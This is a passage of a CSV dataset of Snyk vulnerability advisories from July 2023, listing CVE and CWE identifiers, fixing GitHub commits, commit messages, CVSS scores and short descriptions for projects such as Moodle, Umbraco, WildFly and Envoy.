Fix wrong nonce in relayed failed transaction",Unknown,7.5,high,"Affected versions of this package are vulnerable to Denial of Service (DoS). When executing a relayed transaction, if the inner transaction fails, it would increase the inner transaction's sender account nonce. This could have contributed to a limited DoS attack on a targeted account.",2023
CVE-2019-10186,CWE-352,Snyk,https://security.snyk.io/vuln/SNYK-PHP-MOODLEMOODLE-5777704,16/07/2023,24/05/2022,https://github.com/moodle/moodle/commit/ea1ac3c7efbddbdb210ea4c75e7156c7d7ee914b,Cross-site Request Forgery (CSRF),https://api.github.com/repos/moodle/moodle/commits/ea1ac3c7efbddbdb210ea4c75e7156c7d7ee914b,Damyon Wiese,damyon@moodle.com,moodle,ea1ac3c7efbddbdb210ea4c75e7156c7d7ee914b,"MDL-53689 xmldb: Require a sesskey to load xml

Loading and unloading xml files is not protected from XSS with a sesskey.",PHP,8.8,high,"moodle/moodle is a learning platform.
Affected versions of this package are vulnerable to Cross-site Request Forgery (CSRF) due to a sesskey token not being utilized by the XML loading/unloading admin tool.",2023
CVE-2023-34458,CWE-400,Snyk,https://security.snyk.io/vuln/SNYK-GOLANG-GITHUBCOMMULTIVERSXMXCHAINGOPROCESS-5776171,14/07/2023,13/07/2023,https://github.com/multiversx/mx-chain-go/commit/babdb144f1316ab6176bf3dbd7d4621120414d43,Denial of Service (DoS),https://api.github.com/repos/multiversx/mx-chain-go/commits/babdb144f1316ab6176bf3dbd7d4621120414d43,Iulian Pascalau,36724586+iulianpascalau@users.noreply.github.com,mx-chain-go,babdb144f1316ab6176bf3dbd7d4621120414d43,"Merge pull request from GHSA-j494-7x2v-vvvp

Fix wrong nonce in relayed failed transaction",Unknown,7.5,high,"Affected versions of this package are vulnerable to Denial of Service (DoS). When executing a relayed transaction, if the inner transaction fails, it would increase the inner transaction's sender account nonce. This could have contributed to a limited DoS attack on a targeted account.",2023
CVE-2023-34458,CWE-400,Snyk,https://security.snyk.io/vuln/SNYK-GOLANG-GITHUBCOMMULTIVERSXMXCHAINGOSHARDING-5776172,14/07/2023,13/07/2023,https://github.com/multiversx/mx-chain-go/commit/babdb144f1316ab6176bf3dbd7d4621120414d43,Denial of Service (DoS),https://api.github.com/repos/multiversx/mx-chain-go/commits/babdb144f1316ab6176bf3dbd7d4621120414d43,Iulian Pascalau,36724586+iulianpascalau@users.noreply.github.com,mx-chain-go,babdb144f1316ab6176bf3dbd7d4621120414d43,"Merge pull request from GHSA-j494-7x2v-vvvp

Fix wrong nonce in relayed failed transaction",Unknown,7.5,high,"Affected versions of this package are vulnerable to Denial of Service (DoS). When executing a relayed transaction, if the inner transaction fails, it would increase the inner transaction's sender account nonce. This could have contributed to a limited DoS attack on a targeted account.",2023
CVE-2023-37267,CWE-284,Snyk,https://security.snyk.io/vuln/SNYK-DOTNET-UMBRACOCMS-5775820,14/07/2023,13/07/2023,https://github.com/umbraco/Umbraco-CMS/commit/1f26f2c6f3428833892cde5c6d8441fb041e410e,Access Control Bypass,https://api.github.com/repos/umbraco/Umbraco-CMS/commits/1f26f2c6f3428833892cde5c6d8441fb041e410e,Nikolaj Geisle,70372949+zeegaan@users.noreply.github.com,Umbraco-CMS,1f26f2c6f3428833892cde5c6d8441fb041e410e,"Merge pull request from GHSA-h8wc-r4jh-mg7m

* Don't login after install

* Fail the install if database is not created

---------

Co-authored-by: Zeegaan <nge@umbraco.dk>
Co-authored-by: Nikolaj <nikolajlauridsen@protonmail.ch>",C#,7.5,high,"Affected versions of this package are vulnerable to Access Control Bypass. Under rare conditions, a restart of Umbraco can allow unauthorized users to gain admin-level permissions.",2023
CVE-2020-10740,CWE-502,Snyk,https://security.snyk.io/vuln/SNYK-JAVA-ORGWILDFLY-5775830,14/07/2023,24/05/2022,https://github.com/wildfly/wildfly/commit/cd5d2129e2ee60f79d8649c2754d822e60252647,Deserialization of Untrusted Data,https://api.github.com/repos/wildfly/wildfly/commits/cd5d2129e2ee60f79d8649c2754d822e60252647,Brian Stansberry,brian.stansberry@redhat.com,wildfly,cd5d2129e2ee60f79d8649c2754d822e60252647,[WFLY-13549] Apply a blacklist to classes unmarshalled via RemoteEjbService,Java,7.5,high,Affected versions of this package are vulnerable to Deserialization of Untrusted Data in the Enterprise Application Beans (EJB) due to lack of validation/filtering capabilities in wildfly.,2023
CVE-2020-7210,CWE-352,Snyk,https://security.snyk.io/vuln/SNYK-DOTNET-UMBRACOCMS-5775818,14/07/2023,24/05/2022,https://github.com/umbraco/Umbraco-CMS/commit/b613f8b56d4079e74cc56a5ad21378f7c7657a19,Cross-site Request Forgery (CSRF),https://api.github.com/repos/umbraco/Umbraco-CMS/commits/b613f8b56d4079e74cc56a5ad21378f7c7657a19,Claus,claus@umbraco.com,Umbraco-CMS,b613f8b56d4079e74cc56a5ad21378f7c7657a19,"Merge pull request #7315 from umbraco/v8/bug/3935-useractions-xsrf-validation

Adding extra validation for anti forgery tokens",C#,4.3,medium,"UmbracoCms is a package that installs Umbraco Cms in your Visual Studio ASP.NET project
Affected versions of this package are vulnerable to Cross-site Request Forgery (CSRF) which allows an attacker to perform arbitrary web requests with the identity of the victim, e.g. in order to enable/disable or delete user accounts.",2023
CVE-2020-14297,CWE-400,Snyk,https://security.snyk.io/vuln/SNYK-JAVA-ORGJBOSS-5775816,14/07/2023,24/05/2022,https://github.com/wildfly/jboss-ejb-client/commit/e5f8e4b591f1698a53adc7e430584ca2a8fc9f1b,Denial of Service (DoS),https://api.github.com/repos/wildfly/jboss-ejb-client/commits/e5f8e4b591f1698a53adc7e430584ca2a8fc9f1b,Flavia Rainone,frainone@redhat.com,jboss-ejb-client,e5f8e4b591f1698a53adc7e430584ca2a8fc9f1b,[EJBCLIENT-378] Make sure transaction related invocations are removed after response is received.,Java,6.5,medium,"org.jboss:jboss-ejb-client is a client library for EJB applications working against Wildfly.
Affected versions of this package are vulnerable to Denial of Service (DoS). A vulnerability was found in Wildfly's EJB Client, where accumulation of some specific EJB transaction objects in InvocationTracker may lead to DoS.",2023
CVE-2020-35459,CWE-78,Snyk,https://security.snyk.io/vuln/SNYK-PYTHON-CRMSH-5775814,14/07/2023,24/05/2022,https://github.com/ClusterLabs/crmsh/commit/c538024b8ebd138dc373b005189471d9b77e9c82,Command Injection,https://api.github.com/repos/ClusterLabs/crmsh/commits/c538024b8ebd138dc373b005189471d9b77e9c82,liangxin1300,XLiang@suse.com,crmsh,c538024b8ebd138dc373b005189471d9b77e9c82,"Fix: bootstrap: setup authorized ssh access for hacluster(CVE-2020-35459, bsc#1179999; CVE-2021-3020, bsc#1180571)",Python,7.8,high,"crmsh is a Command-line interface for High-Availability cluster management
Affected versions of this package are vulnerable to Command Injection. Local attackers able to call crm history (when crm is run) are able to execute commands via shell code injection to the crm history command line, potentially allowing escalation of privileges.",2023
CVE-2020-1691,CWE-79,Snyk,https://security.snyk.io/vuln/SNYK-PHP-MOODLEMOODLE-5775812,14/07/2023,06/08/2022,https://github.com/moodle/moodle/commit/4e809346537e230cbff8235bfee0e7e151e4e9f9,Cross-site Scripting (XSS),https://api.github.com/repos/moodle/moodle/commits/4e809346537e230cbff8235bfee0e7e151e4e9f9,Jake Dallimore,jake@moodle.com,moodle,4e809346537e230cbff8235bfee0e7e151e4e9f9,"MDL-67637 core_message: only preview lastmessage text if safe to do so

If any html/script tags are found in the text() value, don't display it.",JavaScript,5.4,medium,"moodle/moodle is a learning platform.
Affected versions of this package are vulnerable to Cross-site Scripting (XSS) due to improper user-input sanitization in message conversation overview.",2023
CVE-2020-14320,CWE-79,Snyk,https://security.snyk.io/vuln/SNYK-PHP-MOODLEMOODLE-5775813,14/07/2023,17/08/2022,https://github.com/moodle/moodle/commit/c6ffe9588ebb02b73c33a09e5d8061f58acc1701,Cross-site Scripting (XSS),https://api.github.com/repos/moodle/moodle/commits/c6ffe9588ebb02b73c33a09e5d8061f58acc1701,Michael Hawkins,michaelh@moodle.com,moodle,c6ffe9588ebb02b73c33a09e5d8061f58acc1701,MDL-69128 admin: Convert HTML entities when populating tasklogs filter,PHP,6.1,medium,"moodle/moodle is a learning platform.
Affected versions of this package are vulnerable to Cross-site Scripting (XSS) due to improper user-input sanitization via the filter in the admin task log.",2023
CVE-2019-12618,CWE-264,Snyk,https://security.snyk.io/vuln/SNYK-GOLANG-GITHUBCOMHASHICORPNOMADDRIVERSSHAREDEXECUTOR-5777702,16/07/2023,24/05/2022,https://github.com/hashicorp/nomad/commit/86a6569933bd43a8349b5e8d72aa0518c0d2906e,Privilege Escalation,https://api.github.com/repos/hashicorp/nomad/commits/86a6569933bd43a8349b5e8d72aa0518c0d2906e,Mahmood Ali,mahmood@hashicorp.com,nomad,86a6569933bd43a8349b5e8d72aa0518c0d2906e,"Merge pull request #5728 from hashicorp/restore-08-caps

drivers/exec: Restore 0.8 capabilities",Go,8.3,high,Affected versions of this package are vulnerable to Privilege Escalation which allows the exec driver to run with full Linux capabilities such that processes can escalate to run as the root user.,2023
CVE-2023-36617,CWE-1333,Snyk,https://security.snyk.io/vuln/SNYK-RUBY-URI-5777696,16/07/2023,29/06/2023,https://github.com/ruby/uri/commit/3cd938df20db26c9439e9f681aadfb9bbeb6d1c0,Regular Expression Denial of Service (ReDoS),https://api.github.com/repos/ruby/uri/commits/3cd938df20db26c9439e9f681aadfb9bbeb6d1c0,Nobuyoshi Nakada,nobu@ruby-lang.org,uri,3cd938df20db26c9439e9f681aadfb9bbeb6d1c0,"Fix quadratic backtracking on invalid port number

https://hackerone.com/reports/1958260",Ruby,5.3,medium,"Affected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) in rfc2396_parser.rb and rfc3986_parser.rb, when processing URI objects .
NOTE: This issue exists due to an incomplete fix for CVE-2023-28755.",2023
CVE-2023-37462,CWE-264,Snyk,https://security.snyk.io/vuln/SNYK-JAVA-ORGXWIKIPLATFORM-5777692,16/07/2023,16/07/2023,https://github.com/xwiki/xwiki-platform/commit/d9c88ddc4c0c78fa534bd33237e95dea66003d29,Privilege Escalation,https://api.github.com/repos/xwiki/xwiki-platform/commits/d9c88ddc4c0c78fa534bd33237e95dea66003d29,Michael Hamann,michael.hamann@xwiki.com,xwiki-platform,d9c88ddc4c0c78fa534bd33237e95dea66003d29,"XWIKI-20457: Improve escaping in SkinsCode.XWikiSkinsSheet

* Add a page test.
* Add missing dependencies.",XML,8.3,high,"Affected versions of this package are vulnerable to Privilege Escalation due to improper escaping in the document SkinsCode.XWikiSkinsSheet, allowing the attacker to escalate privileges from view rights on that document to programming rights. This vulnerability allows the execution of arbitrary script macros, including Groovy and Python macros that allow remote code execution, including unrestricted read and write access to all wiki contents.
Exploiting this vulnerability is possible by opening a non-existing page with a name crafted to contain a dangerous payload.",2023
CVE-2023-3673,CWE-89,Snyk,https://security.snyk.io/vuln/SNYK-PHP-PIMCOREPIMCORE-5777695,16/07/2023,16/07/2023,https://github.com/pimcore/pimcore/commit/a06ce0abdba19ae0eefc38b035e677f8f0c2bce9,SQL Injection,https://api.github.com/repos/pimcore/pimcore/commits/a06ce0abdba19ae0eefc38b035e677f8f0c2bce9,JiaJia Ji,kingjia90@gmail.com,pimcore,a06ce0abdba19ae0eefc38b035e677f8f0c2bce9,"[Task]: Improve Admin translation and application logger sorting (#15303)

* task: improve valid key for translation listing

* task: force the direction to be ASC/DESC since these are the only valid options

* task: quote application logger sorting setting

* task: add backend search grid valid order keys",PHP,7.2,high,"pimcore/pimcore is a content & product management framework (CMS/PIM/E-Commerce).
Affected versions of this package are vulnerable to SQL Injection due to improper sanitization of concatenating strings passed into ORDER BY clause, in the 'sort' parameter.",2023
CVE-2023-37473,CWE-74,Snyk,https://security.snyk.io/vuln/SNYK-PHP-ZENSTRUCKCOLLECTION-5777700,16/07/2023,15/07/2023,https://github.com/zenstruck/collection/commit/f4b1c488206e1b1581b06fcd331686846f13f19c,Improper Neutralization of Special Elements in Output Used by a Downstream Component ('Injection'),https://api.github.com/repos/zenstruck/collection/commits/f4b1c488206e1b1581b06fcd331686846f13f19c,Kevin Bond,kevinbond@gmail.com,collection,f4b1c488206e1b1581b06fcd331686846f13f19c,security(orm): prevent passing callable strings to `find()`/`query()`,PHP,7.5,high,"zenstruck/collection is a collection of helpers for iterating, paginating, filtering collections (with Doctrine ORM/DBAL implementations and batch processing utilities)
Affected versions of this package are vulnerable to Improper Neutralization of Special Elements in Output Used by a Downstream Component ('Injection') in the EntityRepository::find() and query() functions, which can execute strings passed in as callable strings.",2023
CVE-2023-34236,CWE-532,Snyk,https://security.snyk.io/vuln/SNYK-GOLANG-GITHUBCOMWEAVEWORKSTFCONTROLLERRUNNER-5777685,16/07/2023,16/07/2023,https://github.com/weaveworks/tf-controller/commit/28282bc644054e157c3b9a3d38f1f9551ce09074,Insertion of Sensitive Information into Log File,https://api.github.com/repos/weaveworks/tf-controller/commits/28282bc644054e157c3b9a3d38f1f9551ce09074,Chanwit Kaewkasi,chanwit@gmail.com,tf-controller,28282bc644054e157c3b9a3d38f1f9551ce09074,"fix loggin in tf.output

Signed-off-by: Chanwit Kaewkasi <chanwit@gmail.com>",Go,8.5,high,"github.com/weaveworks/tf-controller/runner is a controller for Flux to reconcile Terraform resources in the GitOps way.
Affected versions of this package are vulnerable to Insertion of Sensitive Information into Log File. A user can read unauthorized data in pod logs. The functions tfexec.ShowPlan, tfexec.ShowPlanRaw, and tfexec.Output are implicated when the tfexec object set its Stdout and Stderr to be os.Stdout and os.Stderr respectively. A successful exploit could allow unauthorized access or control of the system.",2023
CVE-2023-3672,CWE-79,Snyk,https://security.snyk.io/vuln/SNYK-JS-WEBMENTIONJS-5776187,14/07/2023,14/07/2023,https://github.com/plaidweb/webmention.js/commit/3551b66b3e40da37fee89ecf72930c5efdc53011,Cross-site Scripting (XSS),https://api.github.com/repos/plaidweb/webmention.js/commits/3551b66b3e40da37fee89ecf72930c5efdc53011,fluffy,fluffy@beesbuzz.biz,webmention.js,3551b66b3e40da37fee89ecf72930c5efdc53011,"XSS mitigation

This change fixes a security issue raised by @tyage and reported by @psmoros,
in which the `p-name` property wasn't being properly entity-escaped, leading
to an XSS injection attack.

As part of this change I also improved the way that entities are being escaped.",JavaScript,7.3,high,"webmention.js is a Client-side library for rendering webmentions from webmention.io
Affected versions of this package are vulnerable to Cross-site Scripting (XSS) due to improper user-input sanitization via the comment name parameter.",2023
CVE-2023-34036,CWE-644,Snyk,https://security.snyk.io/vuln/SNYK-JAVA-ORGSPRINGFRAMEWORKHATEOAS-5777682,16/07/2023,16/07/2023,https://github.com/spring-projects/spring-hateoas/commit/03d20998a2fec7114ed8c6a7970af1d325391ea5,HTTP Header Injection,https://api.github.com/repos/spring-projects/spring-hateoas/commits/03d20998a2fec7114ed8c6a7970af1d325391ea5,Oliver Drotbohm,odrotbohm@vmware.com,spring-hateoas,03d20998a2fec7114ed8c6a7970af1d325391ea5,#2018 - Switch to UriComponentsBuilder.fromUri(…).,Java,7.1,high,"Affected versions of this package are vulnerable to HTTP Header Injection via the handling of untrusted (X-)Forwarded headers. An attacker can manipulate hypermedia-based responses by injecting malicious content into these headers. This could lead to unauthorized access or misleading information being displayed to the user, compromising the application's data integrity and confidentiality. This is only exploitable if the application uses Spring WebFlux and Spring HATEOAS to generate links in hypermedia-based responses and does not have a mechanism to guard against clients submitting (X-)Forwarded headers.",2023
CVE-2023-37462,CWE-264,Snyk,https://security.snyk.io/vuln/SNYK-JAVA-ORGXWIKIPLATFORM-5777693,16/07/2023,16/07/2023,https://github.com/xwiki/xwiki-platform/commit/d9c88ddc4c0c78fa534bd33237e95dea66003d29,Privilege Escalation,https://api.github.com/repos/xwiki/xwiki-platform/commits/d9c88ddc4c0c78fa534bd33237e95dea66003d29,Michael Hamann,michael.hamann@xwiki.com,xwiki-platform,d9c88ddc4c0c78fa534bd33237e95dea66003d29,"XWIKI-20457: Improve escaping in SkinsCode.XWikiSkinsSheet

* Add a page test.
* Add missing dependencies.",XML,8.3,high,"Affected versions of this package are vulnerable to Privilege Escalation due to improper escaping in the document SkinsCode.XWikiSkinsSheet, allowing the attacker to escalate privileges from view rights on that document to programming rights. This vulnerability allows the execution of arbitrary script macros, including Groovy and Python macros that allow remote code execution, including unrestricted read and write access to all wiki contents.
Exploiting this vulnerability is possible by opening a non-existing page with a name crafted to contain a dangerous payload.",2023
CVE-2023-38325,CWE-295,Snyk,https://security.snyk.io/vuln/SNYK-PYTHON-CRYPTOGRAPHY-5777683,16/07/2023,15/07/2023,https://github.com/pyca/cryptography/commit/e190ef190525999d1f599cf8c3aef5cb7f3a8bc4,Improper Certificate Validation,https://api.github.com/repos/pyca/cryptography/commits/e190ef190525999d1f599cf8c3aef5cb7f3a8bc4,Paul Kehrer,paul.l.kehrer@gmail.com,cryptography,e190ef190525999d1f599cf8c3aef5cb7f3a8bc4,"Backport ssh cert fix (#9211)

* Fix encoding of SSH certs with critical options (#9208)

* Add tests for issue #9207

* Fix encoding of SSH certs with critical options

* Test unexpected additional values for crit opts/exts

* temporarily allow invalid ssh cert encoding

---------

Co-authored-by: jeanluc <2163936+lkubb@users.noreply.github.com>",Unknown,7.4,high,"Affected versions of this package are vulnerable to Improper Certificate Validation in the SSH certificate decoding process. An attacker can cause the application to accept unauthorized SSH certificates generated by ssh-keygen, or cause certificates generated by SSHCertificateBuilder  to fail when read by ssh-keygen. 
Note:
This is only exploitable if the attacker controls the SSH certificate generation process or can introduce crafted SSH certificates into the system.",2023
,CWE-453,Snyk,https://security.snyk.io/vuln/SNYK-RUBY-RANSACK-5776488,14/07/2023,14/07/2023,https://github.com/activerecord-hackery/ransack/commit/2922e334ad2ff8dbcdcdbb02e97c6548e487ff43,Insecure Defaults,https://api.github.com/repos/activerecord-hackery/ransack/commits/2922e334ad2ff8dbcdcdbb02e97c6548e487ff43,David Rodríguez,deivid.rodriguez@riseup.net,ransack,2922e334ad2ff8dbcdcdbb02e97c6548e487ff43,"Require explict allowlisting of attributes and associations (#1400)

Co-authored-by: lukas-eu <62448426+lukas-eu@users.noreply.github.com>
Co-authored-by: Wes Oldenbeuving <wes@narnach.com>",Ruby,8.2,high,"Affected versions of this package are vulnerable to Insecure Defaults. The library poses a major security risk that can likely be exploited to extract sensitive information or fully compromise the application. An attacker is be able to perform character by character brute-force of arbitrary attributes on associated database objects. 
Note:
An application is potentially vulnerable if it exposes a search/filtering function which processes an unrestricted query object, usually represented by a Ruby hash constructed via the q GET parameter.",2023
CVE-2023-3692,CWE-434,Snyk,https://security.snyk.io/vuln/SNYK-PHP-ADMIDIOADMIDIO-5777684,16/07/2023,16/07/2023,https://github.com/admidio/admidio/commit/d66585d14b1160712a8a9bfaf9769dd3da0e9a83,Arbitrary File Upload,https://api.github.com/repos/admidio/admidio/commits/d66585d14b1160712a8a9bfaf9769dd3da0e9a83,Markus Faßbender,markus.fassbender@gmail.com,admidio,d66585d14b1160712a8a9bfaf9769dd3da0e9a83, Possible to upload non image files within ckeditor #1455,PHP,4.3,medium,"admidio/admidio is a free open source user management system for websites of organizations and groups.
Affected versions of this package are vulnerable to Arbitrary File Upload due to not validating files uploaded via ckeditor.",2023
CVE-2023-38337,CWE-22,Snyk,https://security.snyk.io/vuln/SNYK-RUBY-RSWAG-5777686,16/07/2023,16/07/2023,https://github.com/rswag/rswag/commit/5b34ec9bed830336b227983fa5bfd06f86266c6d,Directory Traversal,https://api.github.com/repos/rswag/rswag/commits/5b34ec9bed830336b227983fa5bfd06f86266c6d,Roman Blanco,1187051+romanblanco@users.noreply.github.com,rswag,5b34ec9bed830336b227983fa5bfd06f86266c6d,"Merge pull request #660 from carlobeltrame/patch-1

Fix path expansion",Ruby,7.5,high,"rswag is a package for generating beautiful API documentation directly from rspec integration tests
Affected versions of this package are vulnerable to Directory Traversal in api/middleware.rb, which is accessible via the rswag-api component. JSON and YAML other than the OpenAPI (or Swagger) specification file of a project can be exposed to users.",2023
CVE-2023-37463,CWE-400,Snyk,https://security.snyk.io/vuln/SNYK-UNMANAGED-GITHUBCMARKGFM-5776183,14/07/2023,14/07/2023,https://github.com/github/cmark-gfm/commit/38d1cfeba3ce457da53e77f9712dfbce95d8558c,Denial of Service (DoS),https://api.github.com/repos/github/cmark-gfm/commits/38d1cfeba3ce457da53e77f9712dfbce95d8558c,Bas Alberts,13686387+anticomputer@users.noreply.github.com,cmark-gfm,38d1cfeba3ce457da53e77f9712dfbce95d8558c,"Merge pull request from GHSA-w4qg-3vf7-m9x5

Fix GHSL-2023-117, GHSL-2023-118, GHSL-2023-119",C/C++,6.4,medium,Affected versions of this package are vulnerable to Denial of Service (DoS). Three polynomial time complexity issues in cmark-gfm may lead to unbounded resource exhaustion.,2023
CVE-2023-3668,CWE-116,Snyk,https://security.snyk.io/vuln/SNYK-PHP-FROXLORFROXLOR-5776178,14/07/2023,14/07/2023,https://github.com/Froxlor/Froxlor/commit/b0e43d332d4dd7d5ea16cca2b1b637468841d45d,Improper Encoding or Escaping of Output,https://api.github.com/repos/Froxlor/Froxlor/commits/b0e43d332d4dd7d5ea16cca2b1b637468841d45d,Michael Kaufmann,d00p@froxlor.org,Froxlor,b0e43d332d4dd7d5ea16cca2b1b637468841d45d,"validate generated config-json parameter string

Signed-off-by: Michael Kaufmann <d00p@froxlor.org>",PHP,9.1,critical,"froxlor/froxlor is a server administration software.
Affected versions of this package are vulnerable to Improper Encoding or Escaping of Output due to insufficient validation in the admin_configfiles.php file.",2023
CVE-2023-37836,CWE-400,Snyk,https://security.snyk.io/vuln/SNYK-UNMANAGED-THORFDBGLIBJPEG-5776180,14/07/2023,14/07/2023,https://github.com/thorfdbg/libjpeg/commit/9e0cea29d7ba7a2c1e763865391bc94b336da25e,Denial of Service (DoS),https://api.github.com/repos/thorfdbg/libjpeg/commits/9e0cea29d7ba7a2c1e763865391bc94b336da25e,Thomas Richter,thomas.richter@iis.fraunhofer.de,libjpeg,9e0cea29d7ba7a2c1e763865391bc94b336da25e,"The bitmap hook can now return an error code that is forwarded to the caller.
Some minimal input sanetization had been added to the encoder and the
(caller-side) bitmap hook implementation and PNM reader.

NOTE THAT DEMO CODE IN ""cmd"" DOES NOT ATTEMPT TO FULLY VALIDATE INPUT
ON THE ENCODER SIDE. IF YOU NEED TO OPERATE THE ENCODER IN AN HOSTILE
ENVIRONMENT, SANETIZATION OF THE INPUT IMAGES IS REQUIRED.

Bumped to 1.66.",Unknown,7.5,high,Affected versions of this package are vulnerable to Denial of Service (DoS) due to containing a reachable assertion via BitMapHook::BitMapHook in the bitmaphook.cpp file.,2023
CVE-2023-35945,CWE-400,Snyk,https://security.snyk.io/vuln/SNYK-UNMANAGED-ENVOYPROXYENVOY-5776181,14/07/2023,14/07/2023,https://github.com/envoyproxy/envoy/commit/b1b66e55362453edd79f46069dad09c807fa9f68,Denial of Service (DoS),https://api.github.com/repos/envoyproxy/envoy/commits/b1b66e55362453edd79f46069dad09c807fa9f68,Yan Avlasov,yavlasov@google.com,envoy,b1b66e55362453edd79f46069dad09c807fa9f68,"http: Fix memory leak in nghttp2 codec

Fix memory leak in nghttp2 when it processes pending requests after
receiving the GOAWAY frame.

Signed-off-by: Yan Avlasov <yavlasov@google.com>
Signed-off-by: Ryan Northey <ryan@synca.io>",Unknown,7.5,high,"Affected versions of this package are vulnerable to Denial of Service (DoS). Envoy’s HTTP/2 codec may leak a header map and bookkeeping structures upon receiving RST_STREAM immediately followed by the GOAWAY frames from an upstream server. In nghttp2, cleanup of pending requests due to receipt of the GOAWAY frame skips de-allocation of the bookkeeping structure and pending compressed header. The error return [code path] is taken if the connection is already marked for not sending more requests due to GOAWAY frame.",2023
CVE-2023-37837,CWE-122,Snyk,https://security.snyk.io/vuln/SNYK-UNMANAGED-THORFDBGLIBJPEG-5776179,14/07/2023,14/07/2023,https://github.com/thorfdbg/libjpeg/commit/9e0cea29d7ba7a2c1e763865391bc94b336da25e,Heap-based Buffer Overflow,https://api.github.com/repos/thorfdbg/libjpeg/commits/9e0cea29d7ba7a2c1e763865391bc94b336da25e,Thomas Richter,thomas.richter@iis.fraunhofer.de,libjpeg,9e0cea29d7ba7a2c1e763865391bc94b336da25e,"The bitmap hook can now return an error code that is forwarded to the caller.
Some minimal input sanetization had been added to the encoder and the
(caller-side) bitmap hook implementation and PNM reader.

NOTE THAT DEMO CODE IN ""cmd"" DOES NOT ATTEMPT TO FULLY VALIDATE INPUT
ON THE ENCODER SIDE. IF YOU NEED TO OPERATE THE ENCODER IN AN HOSTILE
ENVIRONMENT, SANETIZATION OF THE INPUT IMAGES IS REQUIRED.

Bumped to 1.66.",Unknown,7.3,high,Affected versions of this package are vulnerable to Heap-based Buffer Overflow via LineBitmapRequester::EncodeRegion in the linebitmaprequester.cpp file. This vulnerability allows attackers to cause a Denial of Service (DoS) via a crafted file.,2023
CVE-2020-10749,CWE-300,Snyk,https://security.snyk.io/vuln/SNYK-GOLANG-GITHUBCOMCONTAINERNETWORKINGPLUGINSPKGIP-5776176,14/07/2023,24/05/2022,https://github.com/containernetworking/plugins/commit/219eb9e0464761c47383d239aba206da695e1a43,Man-in-the-Middle (MitM),https://api.github.com/repos/containernetworking/plugins/commits/219eb9e0464761c47383d239aba206da695e1a43,Casey Callendrello,cdc@redhat.com,plugins,219eb9e0464761c47383d239aba206da695e1a43,"ptp, bridge: disable accept_ra on the host-side interface

The interface plugins should have absolute control over their addressing
and routing.

Signed-off-by: Casey Callendrello <cdc@redhat.com>",Go,6.0,medium,"github.com/containernetworking/plugins/pkg/ip is a CNI network plugins, maintained by the containernetworking team.
Affected versions of this package are vulnerable to Man-in-the-Middle (MitM). A malicious container can exploit this flaw by sending rogue IPv6 router advertisements to the host or other containers, to redirect traffic to the malicious container.",2023
CVE-2020-10749,CWE-300,Snyk,https://security.snyk.io/vuln/SNYK-GOLANG-GITHUBCOMCONTAINERNETWORKINGPLUGINSPLUGINSMAINBRIDGE-5776177,14/07/2023,24/05/2022,https://github.com/containernetworking/plugins/commit/219eb9e0464761c47383d239aba206da695e1a43,Man-in-the-Middle (MitM),https://api.github.com/repos/containernetworking/plugins/commits/219eb9e0464761c47383d239aba206da695e1a43,Casey Callendrello,cdc@redhat.com,plugins,219eb9e0464761c47383d239aba206da695e1a43,"ptp, bridge: disable accept_ra on the host-side interface

The interface plugins should have absolute control over their addressing
and routing.

Signed-off-by: Casey Callendrello <cdc@redhat.com>",Go,6.0,medium,"github.com/containernetworking/plugins/plugins/main/bridge is a CNI network plugins, maintained by the containernetworking team.
Affected versions of this package are vulnerable to Man-in-the-Middle (MitM). A malicious container can exploit this flaw by sending rogue IPv6 router advertisements to the host or other containers, to redirect traffic to the malicious container.",2023
CVE-2020-8553,CWE-610,Snyk,https://security.snyk.io/vuln/SNYK-GOLANG-K8SIOINGRESSNGINXINTERNALINGRESS-5776175,14/07/2023,24/05/2022,https://github.com/kubernetes/ingress-nginx/commit/340bb39384ed5dff446064dd4d18761c1f48e4f7,Externally Controlled Reference to a Resource in Another Sphere,https://api.github.com/repos/kubernetes/ingress-nginx/commits/340bb39384ed5dff446064dd4d18761c1f48e4f7,Manuel Alejandro de Brito Fontes,aledbf@gmail.com,ingress-nginx,340bb39384ed5dff446064dd4d18761c1f48e4f7,Avoid overwrite of auth file,Go,5.9,medium,Affected versions of this package are vulnerable to Externally Controlled Reference to a Resource in Another Sphere due to allowing a user with the ability to create namespaces and to read and create ingress objects to overwrite the password file of another ingress that uses nginx.ingress.kubernetes.io/auth-type: basic and which has a hyphenated namespace or secret name.,2023
CVE-2023-37278,CWE-89,Snyk,https://security.snyk.io/vuln/SNYK-PHP-GLPIGLPI-5776173,14/07/2023,14/07/2023,https://github.com/glpi-project/glpi/commit/65e918b75fc03bcae2597f698dcd4ca8f72af2f4,SQL Injection,https://api.github.com/repos/glpi-project/glpi/commits/65e918b75fc03bcae2597f698dcd4ca8f72af2f4,Cédric Anne,cedric.anne@gmail.com,glpi,65e918b75fc03bcae2597f698dcd4ca8f72af2f4,Prevent SQL injection on dashboard administration,PHP,6.8,medium,"glpi/glpi is a free Asset and IT Management Software package with ITIL Service Desk, licenses tracking and software auditing.
Affected versions of this package are vulnerable to SQL Injection due to improper user-input validation such that an administrator can trigger this vulnerability via dashboard administration.",2023
CVE-2021-29417,CWE-22,Snyk,https://security.snyk.io/vuln/SNYK-GOLANG-GITHUBCOMLIAMGGITJACKERINTERNALPKGGITJACKER-5776174,14/07/2023,25/05/2022,https://github.com/liamg/gitjacker/commit/d72a53a921aa8849cbddd59841bf1a802be89c62,Directory Traversal,https://api.github.com/repos/liamg/gitjacker/commits/d72a53a921aa8849cbddd59841bf1a802be89c62,Liam Galvin,liam@liam-galvin.co.uk,gitjacker,d72a53a921aa8849cbddd59841bf1a802be89c62,Fix traversal,Go,9.8,critical,"Affected versions of this package are vulnerable to Directory Traversal due to improper user-input sanitization, allowing remote attackers to execute arbitrary code via a crafted .git directory.",2023
CVE-2023-29449,CWE-400,Snyk,https://security.snyk.io/vuln/SNYK-UNMANAGED-ZABBIXZABBIX-5773330,13/07/2023,13/07/2023,https://github.com/zabbix/zabbix/commit/7f5f74e4bb4c6213c37229eea849bc4aef15e88f,Denial of Service (DoS),https://api.github.com/repos/zabbix/zabbix/commits/7f5f74e4bb4c6213c37229eea849bc4aef15e88f,Vladislavs Sokurenko,vladislavs.sokurenko@zabbix.com,zabbix,7f5f74e4bb4c6213c37229eea849bc4aef15e88f,".D........ [ZBX-22589] added ChangeLog entry

